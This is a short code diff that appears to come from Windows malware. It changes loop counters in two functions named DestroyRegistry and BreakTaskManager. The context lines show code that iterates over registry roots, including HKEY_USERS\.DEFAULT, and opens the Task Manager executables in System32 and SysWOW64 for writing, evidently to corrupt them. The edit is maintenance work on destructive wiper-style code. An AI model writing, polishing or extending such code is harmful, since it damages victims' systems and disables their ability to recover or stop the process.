@@ -172,7 +172,8 @@ void DestroyRegistry() {
         L"HKEY_USERS\\.DEFAULT"
     };
 
-    for (int i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
+    for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
+        
         HKEY hKey;
         wchar_t subKey[256];
         wchar_t rootKey[256];
@@ -265,7 +266,7 @@ void BreakTaskManager() {
         L"C:\\Windows\\SysWOW64\\taskmgr.exe"
     };
 
-    for (int i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
+   for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
         HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD fileSize = GetFileSize(hFile, NULL);
